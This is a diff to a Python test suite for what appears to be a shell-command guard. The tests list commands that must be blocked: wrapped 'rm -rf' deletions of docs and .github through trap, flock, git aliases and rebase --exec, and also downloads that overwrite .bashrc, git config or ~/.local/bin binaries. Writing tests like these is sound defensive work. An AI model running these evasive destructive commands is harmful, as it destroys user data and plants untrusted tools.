@@ -995,7 +995,7 @@ class Round2(ProtectedTree):
     def test_nested_and_wrapper_forms(self):
         self.blocked(["trap 'rm -rf docs' EXIT", "coproc rm -rf docs", "watch -n1 rm -rf docs",
                       "parallel rm -rf ::: docs", "flock /tmp/l -c 'rm -rf docs'", "flock -c 'rm -rf docs' /tmp/l",
-                      "find .github -exec sh -c 'rm \"$1\"' _ {} \;", "find .github -name '*.yml' -exec nice rm {} +",
+                      "find .github -exec sh -c 'rm \"$1\"' _ {} \\;", "find .github -name '*.yml' -exec nice rm {} +",
                       "git -c alias.zz='!rm -rf .github' zz", "git rebase --exec 'rm -rf .github' main",
                       "git rebase -x 'rm -rf .github' main"])
         self.allowed(["trap 'echo done' EXIT", "watch -n1 ls", "git rebase --exec 'make test' main",
@@ -1217,7 +1217,9 @@ class Round3(ProtectedTree):
         self.blocked(["git clone --depth 1 /tmp/evil ~/.config/git", "git clone -b main /tmp/evil ~/.config/git",
                       "GIT_WORK_TREE=$HOME git checkout HEAD -- .bashrc", "cd ~/.config/git && wget https://e.x/config",
                       "cd ~/.local/bin && curl -O https://e.x/ssh-keygen", "rsync --remove-sent-files .github/workflows/ /tmp/x"])
-        self.allowed(["cd /tmp && wget https://e.x/f", "git clone --depth 1 https://x/y /tmp/y"])
+        import tempfile
+        with tempfile.TemporaryDirectory() as plain:              # not an ancestor of the plugin or of home
+            self.allowed([f"cd {plain} && wget https://e.x/f", f"git clone --depth 1 https://x/y {plain}/y"])
 
 
 if __name__ == "__main__":
